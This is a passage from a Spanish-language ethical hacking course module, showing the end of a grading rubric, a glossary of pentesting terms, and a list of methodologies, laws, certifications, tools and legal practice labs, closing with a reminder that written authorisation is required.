| **Contramedidas** | Ausentes | Genéricas | Específicas por hallazgo | Detalladas, priorizadas y defendibles |
| **Informe** | Confuso, sin evidencias | Estructura básica | Claro, con evidencias y CVSS | Profesional: ejecutivo + técnico impecables |
| **Ética y legalidad** | Incumplimientos | Cumple mínimos | Documenta autorización y ROE | Aplica RGPD, minimización y divulgación responsable |

---

## Glosario

- **0-day (día cero):** vulnerabilidad sin parche disponible, desconocida para el fabricante.
- **Alcance (scope):** conjunto exacto de sistemas y acciones autorizadas en una auditoría.
- **AXFR:** transferencia de zona DNS; mal restringida, expone todos los registros.
- **CVE:** identificador público único de una vulnerabilidad.
- **CVSS:** sistema de puntuación de la gravedad de vulnerabilidades (0-10).
- **CWE:** enumeración de tipos de debilidades de software.
- **Enumeración:** extracción detallada de información de un servicio (usuarios, recursos).
- **Exploit:** técnica o código que aprovecha una vulnerabilidad.
- **Fuerza bruta:** prueba sistemática de credenciales.
- **Handshake (4 vías):** intercambio de autenticación en WPA/WPA2.
- **Hash:** representación irreversible de un dato; usado para almacenar contraseñas.
- **IoC (Indicador de Compromiso):** evidencia de que un sistema ha sido atacado.
- **Meterpreter:** payload avanzado de Metasploit para post-explotación.
- **MFA/2FA:** autenticación multifactor.
- **MITRE ATT&CK:** base de conocimiento de tácticas y técnicas adversarias.
- **NSE:** motor de scripts de nmap.
- **OSINT:** inteligencia obtenida de fuentes abiertas.
- **Payload:** código que se ejecuta tras la explotación.
- **Pentesting:** test de intrusión autorizado.
- **Persistencia:** mecanismos para mantener el acceso.
- **Phishing:** engaño para obtener información/credenciales, típicamente por correo.
- **Pivoting:** uso de un sistema comprometido para alcanzar otros.
- **Post-explotación:** acciones tras obtener acceso (escalada, persistencia, movimiento lateral).
- **ROE (Rules of Engagement):** reglas de enfrentamiento de la auditoría.
- **RGPD:** Reglamento General de Protección de Datos (UE 2016/679).
- **Salt:** valor aleatorio añadido a una contraseña antes de hashearla.
- **Shell inversa (reverse shell):** conexión iniciada desde la víctima hacia el atacante.
- **SUID:** bit de permiso que ejecuta un binario con los privilegios del propietario.
- **Vulnerabilidad:** debilidad explotable de un sistema.
- **WAF:** cortafuegos de aplicaciones web.
- **Webshell:** fichero web malicioso que permite ejecutar comandos.
- **WIDS:** sistema de detección de intrusiones inalámbricas.

---

## Recursos y bibliografía

### Marcos y metodologías

- **PTES** — *Penetration Testing Execution Standard*. Estándar de ejecución de test de intrusión.
- **OSSTMM** — *Open Source Security Testing Methodology Manual* (ISECOM).
- **OWASP WSTG** — *Web Security Testing Guide* (OWASP).
- **OWASP Top 10** — Riesgos más críticos en aplicaciones web (OWASP).
- **MITRE ATT&CK** — Base de conocimiento de tácticas y técnicas adversarias.
- **NIST SP 800-115** — *Technical Guide to Information Security Testing and Assessment*.

### Normativa y organismos (España/UE)

- **Código Penal español** — arts. 197 bis, 197 ter, 264, 264 bis, 264 ter.
- **RGPD** (Reglamento UE 2016/679) y **LOPDGDD** (Ley Orgánica 3/2018).
- **INCIBE** — Instituto Nacional de Ciberseguridad (guías y coordinación de divulgación).
- **CCN-CERT** — Centro Criptológico Nacional (guías CCN-STIC).
- **AEPD** — Agencia Española de Protección de Datos.

### Certificaciones profesionales de referencia

- **OSCP** (*Offensive Security Certified Professional*) — Offensive Security. Práctica, muy valorada.
- **CEH** (*Certified Ethical Hacker*) — EC-Council.
- **eJPT / eCPPT** — INE/eLearnSecurity.
- **CompTIA PenTest+** — CompTIA.
- **GPEN / GWAPT** — SANS/GIAC.

### Herramientas (uso ético y en laboratorio)

| Categoría | Herramientas |
|---|---|
| Distribución | Kali Linux, Parrot Security OS |
| Reconocimiento/OSINT | theHarvester, Maltego, Recon-ng, Shodan |
| Escaneo | nmap (+NSE), masscan |
| Vulnerabilidades | Nessus, OpenVAS/Greenbone, searchsploit (Exploit-DB) |
| Explotación | Metasploit Framework, sqlmap |
| Web | Burp Suite, OWASP ZAP, gobuster, whatweb |
| Credenciales | Hydra, John the Ripper, Hashcat |
| Post-explotación | linPEAS, winPEAS, Mimikatz (conceptual), proxychains |
| Wi-Fi | aircrack-ng suite |
| Ingeniería social | Gophish, SET (Social-Engineer Toolkit) |

### Entornos de práctica legales

- **Metasploitable 2 / 3** — máquinas Linux/Windows deliberadamente vulnerables.
- **VulnHub** — imágenes de VM vulnerables para descargar.
- **DVWA, OWASP Juice Shop, Mutillidae, bWAPP** — aplicaciones web vulnerables.
- **Hack The Box, TryHackMe** — plataformas legales de entrenamiento con permiso explícito.
- **OverTheWire, PortSwigger Web Security Academy** — retos y laboratorios web guiados.

> **Cierre del módulo:** El hacking ético es, ante todo, una **disciplina de confianza**. El profesional recibe acceso privilegiado a los sistemas más sensibles de una organización precisamente porque demuestra **rigor técnico, integridad y estricto respeto a la ley**. Recuerda siempre la regla de oro: *sin autorización por escrito, no se toca nada*. El conocimiento ofensivo de este módulo tiene un único propósito legítimo: **defender mejor**.
